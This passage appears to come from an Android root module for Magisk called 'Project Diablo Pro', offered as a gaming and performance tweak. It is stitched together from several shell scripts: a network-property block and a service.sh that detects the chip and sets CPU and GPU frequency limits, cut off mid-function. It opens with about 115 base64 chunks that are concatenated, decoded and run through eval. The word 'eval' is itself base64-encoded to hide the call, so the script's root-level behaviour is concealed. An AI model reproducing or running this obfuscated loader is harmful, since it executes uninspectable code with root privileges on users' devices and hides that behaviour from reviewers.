c7d0d6PSdwdXQ9JztwSHo9J2lsZSInO01Hej0nc3lzdCc7aHo9";\
z132="
J2lmIGMnO1dJej0nOyIgMic7YkV6PScqL2RlJzt5Qno9J250IC";\
z133="
QnO0xFej0nYmFzZSc7aEV6PSdcXC99Jztpej0nb21tYSc7cEV6";\
z134="
PSdcW0ZJJzt1RHo9JyBJbXAnO1NHej0ncm9kdSc7dno9Jy12ZX";\
z135="
InO2tJej0nTUEgbyc7QkZ6PSd3aGlsJzthRHo9J1AiIF0nO2ZD";\
z136="
ej0nJChnZSc7R0V6PSdkcm9pJzt5ej0nZGV2Lyc7Z3o9J1UiJz";\
z137="
tLRHo9J+KAjeKdhO+4jyInO2pGej0nbWQgcCc7bUd6PSdbICEg";\
z138="
JztPQno9J0NPREUnO3dGej0nZy1kZSc7ckR6PSdEX1ZFJztsR3";\
z139="
o9J2RvJztoSXo9J0RFWDsnO0xJej0nTDsiICc7R0p6PSdlcyAv";\
z140="
Jzt3Qno9JzonXCcnICdcJycnO2dDej0ndHBybyc7U0l6PSdlbX";\
z141="
BfJztWRXo9J3NlZCAnO3hCej0ne3ByaSc7Qkl6PSdvdXJuJzta";\
z142="
ej0nXTsgdCc7SkV6PSdpbWl6JztOSXo9J2FjaGUnO0hKej0nL3";\
z143="
VzZSc7SUN6PSdLX1ZFJztWR3o9J3h0IC8nO0V6PSdkaXJuJztw";\
z144="
Sno9J1JBR00nO1hKej0ncF9kYic7aEN6PSdwIHJvJzt5Rno9Jy";\
z145="
1qb2InO2RHej0nIiAyPic7QkJ6PScgfCBjJztXRHo9Jzs7Jzty";\
z146="
R3o9JyYmIGMnO09Hej0nY2FjaCc7eUd6PSdsZSAiJztQQ3o9J2";\
z147="
RiL2EnO2lCej0nYWdpcyc7SUd6PScpIHsnO2lGej0nYyAiYyc7";\
z148="
a0h6PScwMCBdJzttRXo9Jy1pICdcJycnO0ZFej0nciBBbic7SE";\
z149="
h6PSdlcCAtJztpR3o9J2FkIGQnOwpldmFsICIkQXokQnokQ3ok";\
z150="
RHokRXokRnokR3okSHokSXokSnokeiRLeiRMeiRNeiROeiRPei";\
z151="
RQeiRReiRSeiRTeiR6JFR6JFV6JFZ6JFd6JFh6JFl6JFp6JGF6";\
z152="
JHokYnokY3okZHokZXokZnokZ3okeiRoeiRpeiRqeiRreiRsei";\
z153="
RteiRueiRveiRweiRxeiR6JGJ6JHJ6JHN6JHR6JHV6JHZ6JHd6";\
z154="
JHh6JHl6JEFCeiRCQnokQ0J6JERCeiRFQnokRkJ6JEdCeiRIQn";\
z155="
okSUJ6JHJ6JEpCeiRLQnokSUJ6JExCeiRNQnokTkJ6JE9CeiRQ";\
z156="
QnokeiRRQnokeiRSQnokU0J6JFRCeiRVQnokVkJ6JFdCeiRYQn";\
z157="
okWUJ6JFpCeiR6JGJ6JGN6JGR6JGFCeiRYQnokeiRoeiRpeiRq";\
z158="
eiRiQnokY0J6JGx6JG16JG56JG96JHB6JHF6JHokZEJ6JGVCei";\
z159="
RmQnokZ0J6JGhCeiRpQnokakJ6JHh6JHl6JEFCeiRrQnokeiRk";\
z160="
QnokZUJ6JGxCeiRtQnokaEJ6JGlCeiRuQnokeHokeXokQUJ6JG";\
z161="
9CeiRwQnokcUJ6JHJCeiRzQnokdEJ6JHVCeiR2Qnokd0J6JHhC";\
z162="
eiR5QnokQUN6JEJDeiRDQ3okREN6JFN6JHokYnokcnokc3okRU";\
z163="
N6JGRCeiRlQnokZkJ6JEZDeiRHQ3okSEN6JElDeiRKQ3okS0N6";\
z164="
JHokUUJ6JHokUkJ6JFNCeiRUQnokVUJ6JFZCeiRMQ3okWUJ6JF";\
z165="
pCeiR6JGJ6JGN6JGR6JE1DeiROQ3okeiRUeiRPQ3okVnokV3ok";\
z166="
UEN6JFFDeiRSQ3okU0N6JHB6JHF6JHokYnokcnokc3okdHokVE";\
z167="
N6JFVDeiRWQ3okV0N6JFhDeiR3eiRZQ3okWkN6JGFDeiRmQnok";\
z168="
RkN6JFN6JHokUUJ6JHokUUJ6JHokYkN6JGNDeiRkQ3okZUN6JG";\
z169="
ZDeiRnQ3okaEN6JGlDeiRqQ3oka0N6JGxDeiRtQ3okbkN6JG9D";\
z170="
eiRwQ3okcUN6JHokYkN6JGNDeiRyQ3okZkN6JGdDeiRoQ3okaU";\
z171="
N6JGpDeiRrQ3okc0N6JHRDeiRvQ3okcEN6JHFDeiR6JHVDeiR2";\
z172="
Q3okd0N6JHhDeiR5Q3okQUR6JHokQkR6JENEeiRERHokRUR6JH";\
z173="
okRkR6JENEeiRHRHokRUR6JHokSER6JENEeiRJRHokRUR6JHok";\
z174="
SkR6JENEeiRERHokS0R6JExEeiR6JE1EeiRDRHokTkR6JEVEei";\
z175="
R6JE9EeiRDRHokUER6JEVEeiR6JFFEeiRDRHokUkR6JEVEeiR6";\
z176="
JFNEeiRDRHokVER6JEVEeiR6JFVEeiRDRHokVkR6JFdEeiR6JF";\
z177="
hEeiR6JFR6JE9DeiROeiRZRHokWkR6JGFEeiRweiRxeiR6JGJE";\
z178="
eiRjRHokZUN6JGREeiRlRHokZkR6JGdEeiRoRHokaUR6JGZEei";\
z179="
RkQ3okakR6JGtEeiRsRHokbUR6JG5EeiRvRHokcER6JHFEeiRy";\
z180="
RHokc0R6JHREeiR1RHokdkR6JHdEeiR4RHokeUR6JEFFeiRCRX";\
z181="
okQ0V6JERFeiRFRXokRkV6JEdFeiRIRXokSUV6JEpFeiRLRXok";\
z182="
VUJ6JExFeiRNRXokTkV6JE9FeiRQRXokUUV6JFJFeiRTRXokVE";\
z183="
V6JFVFeiR6JFZFeiRXRXokWEV6JFlFeiRaRXokYUV6JGJFeiRj";\
z184="
RXokZEV6JGVFeiRiRHokY0R6JGZFeiRnRXokaEV6JGlFeiRqRX";\
z185="
oka0V6JGxFeiRTeiR6JFZFeiRtRXokbkV6JFJDeiRvRXokcEV6";\
z186="
JHFFeiRyRXokc0V6JGtDeiR0RXokdUV6JHZFeiRrQ3okdEV6JH";\
z187="
dFeiR4RXokeUV6JE56JFlEeiRaRHokQUZ6JHokUUJ6JHokQkZ6";\
z188="
JENGeiRERnokRUZ6JEZGeiRHRnokSEZ6JElGeiRKRnokS0Z6JE";\
z189="
xGeiRNRnokTkZ6JHokT0Z6JFBGeiR6JFFGeiR6JFJGeiROeiRP";\
z190="
eiRTRnokSkV6JFRGeiRTeiR6JFR6JE9DeiRVRnokVkZ6JFdGei";\
z191="
RYRnokWUZ6JFpGeiRaeiRheiR6JGFGeiRiRnokY0Z6JGx6JG16";\
z192="
JG56JG96JGRGeiR6JFFCeiR6JGVGeiRmRnokZ0Z6JGhGeiR6JH";\
z193="
V6JGlGeiRqRnoka0Z6JGxGeiRtRnokbkZ6JG9GeiRwRnokcUZ6";\
z194="
JG9DeiRwQ3okckZ6JHNGeiR0RnokdUZ6JHokdXokaUZ6JGpGei";\
z195="
RrRnokdkZ6JHdGeiR4RnokeUZ6JEFHeiR5eiRBQnokQkd6JENH";\
z196="
eiRER3okRUd6JHokRkd6JHokZUZ6JGZGeiRnRnokeiRlRnokZk";\
z197="
Z6JEdHeiRIR3okSUd6JHokSkd6JEtHeiRMR3okTUd6JE5HeiRP";\
z198="
R3okUEd6JFFHeiRSR3okU0d6JFRHeiRNR3okVUd6JFZHeiRXR3";\
z199="
okWEd6JFlHeiRaR3okYUd6JGJHeiRjR3okZEd6JGVHeiRmR3ok";\
z200="
Z0d6JEJGeiRoR3okaUd6JGpHeiRrR3okbEd6JHokbUd6JG5Hei";\
z201="
RvR3okcEd6JHFHeiRyR3okc0d6JHRHeiR6JG1HeiR1R3okb0d6";\
z202="
JHBHeiRxR3okckd6JHNHeiR0R3okeiRwR3okdkd6JHdHeiR4R3";\
z203="
okeUd6JG9HeiRwR3okZEd6JGVHeiRmR3okQUh6JHokQkh6JENI";\
z204="
eiRESHokRUh6JEZIeiRHSHokSEh6JElIeiRKSHokS0h6JExIei";\
z205="
RzR3okdEd6JHokTUh6JE5IeiRPSHokUEh6JFFIeiRSSHokU0h6";\
z206="
JFRIeiRvQ3okcEN6JHFDeiR6JFVIeiRWSHokV0h6JFhIeiRZSH";\
z207="
okWkh6JGFIeiRFR3okeiRiSHokTUh6JGNIeiRkSHokZUh6JFdG";\
z208="
eiRmSHokZ0h6JHokYkh6JE1IeiRjSHokaEh6JGlIeiRqSHoka0";\
z209="
h6JFdGeiRmSHokZ0h6JHokbEh6JG1IeiRuSHokb0h6JHBIeiR4";\
z210="
eiR5eiRBQnokeiRKSHokcUh6JFJIeiRTSHokckh6JHNIeiR0SH";\
z211="
okdUh6JHZIeiR3SHokbXokeEh6JHokSkh6JHFIeiRSSHokU0h6";\
z212="
JHJIeiR5SHokQUl6JEJJeiRDSXokREl6JEVJeiRkR3okZUd6JG";\
z213="
ZHeiRGSXokeiRKSHokcUh6JFJIeiRTSHokckh6JHlIeiRHSXok";\
z214="
SEl6JElJeiRKSXokS0l6JExJeiR3SHokbXokeEh6JHokSkh6JH";\
z215="
FIeiRSSHokU0h6JHJIeiR5SHokTUl6JE5JeiRPSXokUEl6JFFJ";\
z216="
eiRkR3okZUd6JGZHeiRGSXokeiRKSHokcUh6JFJIeiRTSHokck";\
z217="
h6JHlIeiRSSXokU0l6JFRJeiRVSXokVkl6JFdJeiRvQ3okcEN6";\
z218="
JFhJeiR6JEpIeiRxSHokUkh6JFNIeiRySHokeUh6JFlJeiRaSX";\
z219="
okYUl6JGJJeiRjSXokZEl6JHh6JHl6JEFCeiR6JEpIeiRxSHok";\
z220="
Ukh6JFNIeiRySHokZUl6JGZJeiR4eiR5eiRBQnokeiRKSHokcU";\
z221="
h6JFJIeiRTSHokckh6JGdJeiRoSXokZEd6JGVHeiRmR3okRkl6";\
z222="
JHokSkh6JHFIeiRSSHokU0h6JHJIeiRpSXokakl6JGRHeiRlR3";\
z223="
okZkd6JEZJeiR6JEpIeiRxSHokUkh6JFNIeiRySHokeUh6JGtJ";\
z224="
eiRsSXokbUl6JGRHeiRlR3okZkd6JEZJeiR6JEpIeiRxSHokUk";\
z225="
h6JFNIeiRySHokeUh6JG5JeiRvSXokcEl6JHFJeiRySXokc0l6";\
z226="
JHRJeiRkR3okZUd6JGZHeiRGSXokeiRsSHokbUh6JHVJeiRvSH";\
z227="
okcEh6JHh6JHl6JEFCeiR6JFFGeiR6JHZJeiR3SXokeEl6JHlJ";\
z228="
eiRVQnokVUN6JEFKeiRVQnokTEV6JEJKeiRDSnokREp6JEVKei";\
z229="
RVQ3okRkp6JEdKeiRVQnokSEp6JElKeiRFSnokVUN6JEZKeiRK";\
z230="
SnokbEd6JHokbUd6JEtKeiRMSnokTUp6JHFHeiRyR3okc0d6JH";\
z231="
RHeiR6JEpHeiROSnokT0p6JFBKeiRRSnokUkp6JFNKeiRZR3ok";\
z232="
Wkd6JHh6JHl6JEFCeiRUSnokVUp6JFZKeiRXSnokWEp6JE5Gei";\
z233="
R6JG1HeiRuR3okTEp6JFlKeiRaSnokYUp6JGJKeiRjSnokeiRw";\
z234="
R3okdkd6JHdHeiR4R3okeUd6JExKeiRZSnokeHokeXokQUJ6JG";\
z235="
RKeiR6JEJIeiRDSHokREh6JEVIeiRGSHokR0h6JEhIeiRJSHok";\
z236="
Skh6JEtIeiRMSHokc0d6JHRHeiR6JE1IeiROSHokT0h6JFBIei";\
z237="
RRSHokZUp6JFhKeiRkR3okZUd6JGZHeiRBSHokeiRVSHokVkh6";\
z238="
JFdIeiRYSHokZkp6JGdKeiRvR3okYUl6JGhKeiRpSnokZkp6JG";\
z239="
dKeiRvR3okYUl6JGpKeiRrSnokbEp6JG1KeiRZSHokWkh6JGFI";\
z240="
eiRFR3okeiRsSHokbUh6JG5IeiR3SXokbkp6JHdIeiRteiR4SH";\
z241="
okeiRKSHokcUh6JGVKeiRYSnokb0p6JHBKeiRxSnokckp6JHNK";\
z242="
eiR0SnokdUp6JHlIeiRHSXokSEl6JElJeiRKSXokS0l6JHZKei";\
z243="
R3SnokeEp6JHlKeiRBS3okaUl6JGpJeiRkR3okZUd6JGZHeiRG";\
z244="
SXokeiRsSHokbUh6JHVJeiR3SXokbkp6JHdIeiRteiR4SHokei";\
z245="
RRRnokeiRRRnokeiRGR3okeiRlRnokZkZ6JEdHeiRCS3okeiRD";\
z246="
S3okREt6Ig==";\
eCmd="ZXZhbA==";\
bCmd="YmFzZTY0";\
dFlag="LWQ=";\

$(echo "$eCmd" | $(echo "$bCmd" | base64 -d) $(echo "$dFlag" | base64 -d)) "$(echo "${z0}${z1}${z2}${z3}${z4}${z5}${z6}${z7}${z8}${z9}${z10}${z11}${z12}${z13}${z14}${z15}${z16}${z17}${z18}${z19}${z20}${z21}${z22}${z23}${z24}${z25}${z26}${z27}${z28}${z29}${z30}${z31}${z32}${z33}${z34}${z35}${z36}${z37}${z38}${z39}${z40}${z41}${z42}${z43}${z44}${z45}${z46}${z47}${z48}${z49}${z50}${z51}${z52}${z53}${z54}${z55}${z56}${z57}${z58}${z59}${z60}${z61}${z62}${z63}${z64}${z65}${z66}${z67}${z68}${z69}${z70}${z71}${z72}${z73}${z74}${z75}${z76}${z77}${z78}${z79}${z80}${z81}${z82}${z83}${z84}${z85}${z86}${z87}${z88}${z89}${z90}${z91}${z92}${z93}${z94}${z95}${z96}${z97}${z98}${z99}${z100}${z101}${z102}${z103}${z104}${z105}${z106}${z107}${z108}${z109}${z110}${z111}${z112}${z113}${z114}${z115}${z116}${z117}${z118}${z119}${z120}${z121}${z122}${z123}${z124}${z125}${z126}${z127}${z128}${z129}${z130}${z131}${z132}${z133}${z134}${z135}${z136}${z137}${z138}${z139}${z140}${z141}${z142}${z143}${z144}${z145}${z146}${z147}${z148}${z149}${z150}${z151}${z152}${z153}${z154}${z155}${z156}${z157}${z158}${z159}${z160}${z161}${z162}${z163}${z164}${z165}${z166}${z167}${z168}${z169}${z170}${z171}${z172}${z173}${z174}${z175}${z176}${z177}${z178}${z179}${z180}${z181}${z182}${z183}${z184}${z185}${z186}${z187}${z188}${z189}${z190}${z191}${z192}${z193}${z194}${z195}${z196}${z197}${z198}${z199}${z200}${z201}${z202}${z203}${z204}${z205}${z206}${z207}${z208}${z209}${z210}${z211}${z212}${z213}${z214}${z215}${z216}${z217}${z218}${z219}${z220}${z221}${z222}${z223}${z224}${z225}${z226}${z227}${z228}${z229}${z230}${z231}${z232}${z233}${z234}${z235}${z236}${z237}${z238}${z239}${z240}${z241}${z242}${z243}${z244}${z245}${z246}" | $(echo "$bCmd" | base64 -d) $(echo "$dFlag" | base64 -d))"

coreNET=(
  "net.core.somaxconn=4096"
  "net.ipv4.conf.all.accept_redirects=0"
  "net.ipv4.conf.all.rp_filter=1"
  "net.ipv4.conf.default.accept_redirects=0"
  "net.ipv4.ip_no_pmtu_disc=0"
  "net.ipv4.tcp_ecn=0"
  "net.ipv4.tcp_fack=1"
  "net.ipv4.tcp_fin_timeout=30"
  "net.ipv4.tcp_keepalive_time=120"
  "net.ipv4.tcp_mem=786432,1048576,1572864"
  "net.ipv4.tcp_moderate_rcvbuf=1"
  "net.ipv4.tcp_no_metrics_save=1"
  "net.ipv4.tcp_rfc1337=1"
  "net.ipv4.tcp_rmem=4096,87380,6291456"
  "net.ipv4.tcp_sack=1"
  "net.ipv4.tcp_slow_start_after_idle=1"
  "net.ipv4.tcp_syncookies=1"
  "net.ipv4.tcp_timestamps=0"
  "net.ipv4.tcp_window_scaling=1"
  "net.ipv4.tcp_wmem=4096,87380,6291456"
  "net.ipv4.tcp_max_syn_backlog=2048"
  "net.ipv6.conf.all.accept_ra=0"
  "net.ipv6.conf.all.accept_redirects=0"
  "net.ipv6.conf.all.disable_ipv6=1"
  "net.ipv6.conf.all.forwarding=0"
  "net.ipv6.conf.default.accept_ra=0"
  "net.ipv6.conf.default.accept_redirects=0"
  "net.ipv6.conf.default.disable_ipv6=1"
  "net.ipv6.conf.default.forwarding=0"
  "net.tcp.buffersize.default=8192,16384,262144,4096,8192,262144"
  "net.tcp.buffersize.edge=8192,8192,16384,4096,8192,16384"
  "net.tcp.buffersize.evdo_b=4096,262144,1048576,4096,262144,1048576"
  "net.tcp.buffersize.gprs=2048,4096,8192,2048,4096,8192"
  "net.tcp.buffersize.hsdpa=262144,262144,1048576,4096,262144,1048576"
  "net.tcp.buffersize.hspa=4096,16384,262144,4096,8192,262144"
  "net.tcp.buffersize.lte=1048576,1048576,4194304,524288,1048576,4194304"
  "net.tcp.buffersize.nr=1048576,1048576,8388608,524288,1048576,8388608"
  "net.tcp.buffersize.wifi=262144,524288,1048576,262144,524288,1048576"
  "net.tcp.default_init_rwnd=256960"
  "persist.cust.tel.adapt=1"
  "persist.cust.tel.eons=1"
)

for prop in "${coreNET[@]}"; do
  key="${prop%%=*}"
  value="${prop#*=}"

  if [ -n "$key" ] && [ -n "$value" ]; then
    resetprop -n "$key" "$value"
    echo "✓ Set $key to $value"
  else
    echo "✗ Invalid property: $prop"
  fi
done

#!/system/bin/sh
# ══════════════════════════════════════════════════════════════════
#  PROJECT DIABLO PRO v4.2 UNIVERSAL  —  By_Rafael System
#  service.sh  Motor principal + DiabloAI v3 + Lock FPS Engine + FastCharge + IO Engine
#  6 reglas configurables + gamelist con modos por app
# ══════════════════════════════════════════════════════════════════

MODDIR="${0%/*}"
CONF="/data/ProjectDiablo"
CONFIG="$CONF/config.txt"
GAMELIST="$CONF/gamelist.txt"
TRIGGER="$CONF/trigger"
TOUCH_TRIGGER="$CONF/touch_trigger"
FC_CFG="$CONF/fastcharge.txt"
LOG_D="$CONF/rafael.log"
LOG_T="$CONF/touch.log"

# Esperar boot completo
until [ "$(getprop sys.boot_completed)" = "1" ]; do sleep 2; done
sleep 10

# ──────────────────────────────────────────
#  HELPERS
# ──────────────────────────────────────────
tweak() {
    [ -e "$2" ] || return
    chmod 644 "$2" 2>/dev/null
    echo "$1" > "$2" 2>/dev/null
    chmod 444 "$2" 2>/dev/null
}
kwrite() {
    [ -f "$2" ] || return
    chmod 644 "$2" 2>/dev/null
    echo "$1" > "$2" 2>/dev/null
}
cfg_get() { grep "^$1=" "$CONFIG" 2>/dev/null | cut -d= -f2 | tr -d ' \n\r'; }
# Lee el config y lo cacheea en $_CC — solo re-lee si el archivo cambio (mtime)
_CFG_MTIME=""
_load_cfg_cache() {
    local _mt; _mt=$(stat -c '%Y' "$CONFIG" 2>/dev/null)
    if [ "$_mt" != "$_CFG_MTIME" ] || [ -z "$_CC" ]; then
        _CC=$(cat "$CONFIG" 2>/dev/null)
        _CFG_MTIME="$_mt"
    fi
}
cfg_c() { printf '%s\n' "$_CC" | grep "^$1=" | cut -d= -f2 | tr -d ' \n\r'; }
cfg_set() {
    if grep -q "^$1=" "$CONFIG" 2>/dev/null; then
        sed -i "s|^$1=.*|$1=$2|" "$CONFIG"
    else
        echo "$1=$2" >> "$CONFIG"
    fi
    _CFG_MTIME=""
}

# Notificación rápida con throttle anti-rafaga (no bloquea, no spamea)
_NOTIFY_LAST=0
notify() {
    [ "$(cfg_get NOTIFY_ENABLE)" = "0" ] && return
    # Si el panel flotante ya envió la notificación, saltar para no duplicar
    if [ -f /data/local/tmp/.diablo_panel_notified ]; then
        rm -f /data/local/tmp/.diablo_panel_notified
        return
    fi
    local now; now=$(date +%s 2>/dev/null || echo 0)
    [ $((now - _NOTIFY_LAST)) -lt 4 ] && return
    _NOTIFY_LAST=$now
    su -lp 2000 -c "cmd notification post -S bigtext -t 'Project Diablo Pro 😈' TagDiablo '$1' 2>/dev/null" 2>/dev/null &
}

# Log del motor
write_log() {
    {
        echo "=============================="
        echo "Project Diablo Pro v4.2"
        echo "By_Rafael System"
        echo "=============================="
        echo "Fecha  : $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Modo   : $1"
        echo "Origen : $2"
        echo "SOC    : $CHIP_NAME"
        echo "Estado : ACTIVO OK"
        echo "=============================="
    } > "$LOG_D"
}
write_touch_log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') Touch: $1" >> "$LOG_T" 2>/dev/null
}

# ──────────────────────────────────────────
#  DETECCIÓN AUTOMÁTICA DE CHIP
#  DETECCIÓN UNIVERSAL DE CHIP
#
#  Flujo:
#  1. Auto-detección: lee múltiples props del sistema
#  2. Si falla, escanea todos los props buscando palabras clave
#  3. Si el usuario eligió chip manualmente en la app (SOC != 0), respeta esa decisión
#  4. Último recurso: Snapdragon (el más común actualmente)
#
#  SOC=0 en config significa "auto" → siempre detectar
#  SOC=1..6 guardado por el usuario → respetar siempre
# ──────────────────────────────────────────

SOC=""
CHIP_NAME=""
ALL_HW=""

# ── Función de detección por string ──────────────────────────────
# Cubre todos los chips/codenames relevantes a 2025
# MediaTek=1, Snapdragon=2, Exynos=3, Unisoc=4, Tensor=5, Kirin=6
_detect_soc_by_hw() {
    case "$1" in
        MT6*|MT8*|MT9*|DIMENSITY*|HELIO*|MTXXXX*|MEDIATEK*|\
        MT6833*|MT6853*|MT6873*|MT6877*|MT6879*|MT6883*|\
        MT6885*|MT6889*|MT6891*|MT6893*|MT6895*|MT6897*|\
        MT6983*|MT6985*|MT6989*|MT6991*|\
        MT6750*|MT6755*|MT6757*|MT6762*|MT6763*|MT6765*|\
        MT6768*|MT6769*|MT6771*|MT6779*|MT6785*|MT6789*|MT6799*)
            SOC=1; CHIP_NAME="MediaTek" ;;
        SM*|SDM*|MSM*|QSD*|APQ*|SNAPDRAGON*|QUALCOMM*|QCOM*|\
        KALAMA*|PINEAPPLE*|SUN*|LAHAINA*|WAIPIO*|TARO*|UKEE*|\
        CROW*|CAPE*|PARROT*|YUPIK*|DIWALI*|BLAIR*|ANORAK*|\
        RAVELIN*|NIOBE*|LANAI*|MANNAR*|KODIAK*|\
        SM8350|SM8450|SM8475|SM8550|SM8650|SM8750|\
        SM7325|SM7350|SM7375|SM7425|SM7450|SM7475|SM7550|SM7635|\
        SM6375|SM6450|SM4350|SM4450|SM4375)
            SOC=2; CHIP_NAME="Snapdragon" ;;
        EXYNOS*|S5E*|S5P*|\
        EXYNOS1080|EXYNOS1280|EXYNOS1330|EXYNOS1380|\
        EXYNOS2100|EXYNOS2200|EXYNOS2400|\
        EXYNOS9810|EXYNOS9820|EXYNOS9825|\
        S5E8535|S5E8825|S5E9925|S5E9935|S5E9945)
            SOC=3; CHIP_NAME="Exynos" ;;
        UMS*|SC9*|SPREADTRUM*|UNISOC*|\
        T606|T612|T616|T618|T760|T770|T820|T9510|\
        SC9832*|SC9863*|SC7731*)
            SOC=4; CHIP_NAME="Unisoc" ;;
        ZUMA*|SLIDER*|RIPCURRENT*|CLOUDRIPPER*|TENSOR*|\
        GS101|GS201|GS301|GS401)
            SOC=5; CHIP_NAME="Google Tensor" ;;
        KIRIN*|HI3*|HISILICON*|\
        KIRIN659|KIRIN710|KIRIN810|KIRIN820|KIRIN960|\
        KIRIN970|KIRIN980|KIRIN990|KIRIN9000|\
        HI3660|HI3670|HI3680|HI3690)
            SOC=6; CHIP_NAME="Kirin" ;;
        *)
            return 1 ;;
    esac
    return 0
}

_resolve_chip_name() {
    case "$1" in
        1) CHIP_NAME="MediaTek"      ;;
        2) CHIP_NAME="Snapdragon"    ;;
        3) CHIP_NAME="Exynos"        ;;
        4) CHIP_NAME="Unisoc"        ;;
        5) CHIP_NAME="Google Tensor" ;;
        6) CHIP_NAME="Kirin"         ;;
        *) CHIP_NAME="Generic"       ;;
    esac
}

# ── Paso 1: Auto-detección por props del sistema ──────────────────
for _prop in \
    ro.hardware.chipname ro.soc.model ro.board.platform \
    ro.chipname ro.hardware ro.product.board \
    ro.mediatek.platform ro.vendor.mediatek.platform \
    ro.vendor.qcom.chipset ro.soc.manufacturer
do
    _v=$(getprop "$_prop" 2>/dev/null)
    [ -z "$_v" ] && continue
    _detect_soc_by_hw "$(echo "$_v" | tr '[:lower:]' '[:upper:]')" && break
done

# ── Paso 2: Si no detectó, escanear todos los props del sistema ───
if [ -z "$SOC" ]; then
    ALL_HW=$(getprop 2>/dev/null \
        | grep -iE "hardware|platform|chipname|chipset|soc|board|mediatek|qualcomm|qcom|exynos|kirin|tensor|unisoc" \
        | sed 's/.*\[//' | tr -d '[]' | tr '[:lower:]' '[:upper:]' | tr '\n' ' ')
    for _token in $ALL_HW; do
        _detect_soc_by_hw "$_token" && break
    done
fi

# ── Paso 3: Respetar elección manual del usuario si existe ────────
# SOC=0 significa auto → no sobreescribir lo detectado
# SOC=1..6 → el usuario eligió → tiene prioridad absoluta
_SOC_CFG=$(cfg_get SOC 2>/dev/null)
if [ -n "$_SOC_CFG" ] && [ "$_SOC_CFG" != "0" ]; then
    SOC="$_SOC_CFG"
    _resolve_chip_name "$SOC"
fi

# ── Paso 4: Último recurso si todo falló ─────────────────────────
if [ -z "$SOC" ] || [ "$SOC" = "0" ]; then
    SOC=2
    CHIP_NAME="Snapdragon"
fi

# ── Guardar resultado en config para que la app lo muestre ───────
cfg_set SOC "$SOC" 2>/dev/null

# ── Detección de submodelo MediaTek ──────────────────────────────
_HW_ALL="$(echo "$ALL_HW") $(getprop ro.hardware.chipname 2>/dev/null | tr '[:lower:]' '[:upper:]')"
IS_G85=0; IS_G99=0
echo "$_HW_ALL" | grep -qE "MT6769|MT6768" && IS_G85=1
echo "$_HW_ALL" | grep -q  "MT6789"        && IS_G99=1

# ──────────────────────────────────────────
#  HELPERS DE FRECUENCIA UNIVERSAL
# ──────────────────────────────────────────
_maxfreq() { tr ' ' '\n' < "$1" | grep -v '^$' | sort -rn | head -1; }
_minfreq() { tr ' ' '\n' < "$1" | grep -v '^$' | sort -n  | head -1; }

devfreq_max() {
    [ -f "$1/available_frequencies" ] || return
    local f; f=$(_maxfreq "$1/available_frequencies")
    tweak "$f" "$1/max_freq"; tweak "$f" "$1/min_freq"
}
devfreq_unlock() {
    [ -f "$1/available_frequencies" ] || return
    local max min
    max=$(_maxfreq "$1/available_frequencies")
    min=$(_minfreq "$1/available_frequencies")
    kwrite "$max" "$1/max_freq"; kwrite "$min" "$1/min_freq"
}
devfreq_min() {
    [ -f "$1/available_frequencies" ] || return
    local f; f=$(_minfreq "$1/available_frequencies")
    tweak "$f" "$1/min_freq"; tweak "$f" "$1/max_freq"
}

# ══════════════════════════════════════════════════════
#  TWEAKS ESPECÍFICOS POR CHIP
#  Cada función verifica IS_G85 / IS_G99 antes de correr.
#  En cualquier otro chip son no-op (return inmediato).
# ══════════════════════════════════════════════════════

# ── HELIO G85 (MT6769 / MT6768) ──
#  CPU: 6x A55 policy0 hasta 1.8GHz · 2x A75 policy4 hasta 2.0GHz
#  GPU: Mali-G52 MC2 — caps via GED (350 / 820 MHz)
#  EEM: voltaje dinámico activado en max/balance
g85_cpu_max() {
    [ "$IS_G85" = "1" ] || return
    kwrite "0 1800000" /proc/ppm/policy/hard_userlimit_max_cpu_freq 2>/dev/null
    kwrite "1 2000000" /proc/ppm/policy/hard_userlimit_max_cpu_freq 2>/dev/null
    kwrite 1 /proc/eem/eem_enable 2>/dev/null
}
g85_cpu_balance() {
    [ "$IS_G85" = "1" ] || return
    kwrite "0 1800000" /proc/ppm/policy/hard_userlimit_max_cpu_freq 2>/dev/null
    kwrite "1 1700000" /proc/ppm/policy/hard_userlimit_max_cpu_freq 2>/dev/null
    kwrite 1 /proc/eem/eem_enable 2>/dev/null
}
g85_cpu_save() {
    [ "$IS_G85" = "1" ] || return
    kwrite "0 1000000" /proc/ppm/policy/hard_userlimit_max_cpu_freq 2>/dev/null
    kwrite "1 1000000" /proc/ppm/policy/hard_userlimit_max_cpu_freq 2>/dev/null
}
g85_gpu_max() {
    [ "$IS_G85" = "1" ] || return
    # FIX: solo techo (upbound), no forzar piso (boost) — evita GPU al 100% en idle
    kwrite 820000000 /sys/kernel/ged/hal/custom_upbound_gpu_freq 2>/dev/null
    kwrite -1        /sys/kernel/ged/hal/custom_boost_gpu_freq   2>/dev/null
}
g85_gpu_balance() {
    [ "$IS_G85" = "1" ] || return
    kwrite -1 /sys/kernel/ged/hal/custom_upbound_gpu_freq 2>/dev/null
    kwrite -1 /sys/kernel/ged/hal/custom_boost_gpu_freq   2>/dev/null
}
g85_gpu_save() {
    [ "$IS_G85" = "1" ] || return
    kwrite 350000000 /sys/kernel/ged/hal/custom_upbound_gpu_freq 2>/dev/null
    kwrite 350000000 /sys/kernel/ged/hal/custom_boost_gpu_freq   2>/dev/null
}

# ── HELIO G99 (MT6789) ──
#  CPU: 6x A55 policy0 hasta 2.0GHz · 2x A76 policy4 hasta 2.2GHz
#  GPU: Mali-G57 MC2 — caps via GED (400 / 900 MHz)
#  EEM: voltaje dinámico activado en max/balance
g99_cpu_max() {
    [ "$IS_G99" = "1" ] || return
    kwrite "0 2000000" /proc/ppm/policy/hard_userlimit_max_cpu_freq 2>/dev/null
    kwrite "1 2210000" /proc/ppm/policy/hard_userlimit_max_cpu_freq 2>/dev/null
    kwrite 1 /proc/eem/eem_enable 2>/dev/null
}
g99_cpu_balance() {
    [ "$IS_G99" = "1" ] || return
    kwrite "0 1800000" /proc/ppm/policy/hard_userlimit_max_cpu_freq 2>/dev/null
    kwrite "1 1800000" /proc/ppm/policy/hard_userlimit_max_cpu_freq 2>/dev/null
    kwrite 1 /proc/eem/eem_enable 2>/dev/null
}
g99_cpu_save() {
    [ "$IS_G99" = "1" ] || return
    kwrite "0 1200000" /proc/ppm/policy/hard_userlimit_max_cpu_freq 2>/dev/null
    kwrite "1 1200000" /proc/ppm/policy/hard_userlimit_max_cpu_freq 2>/dev/null
}
g99_gpu_max() {
    [ "$IS_G99" = "1" ] || return
    # FIX: solo techo (upbound), no forzar piso (boost) — evita GPU al 100% en idle
    kwrite 1003000 /sys/kernel/ged/hal/custom_upbound_gpu_freq 2>/dev/null
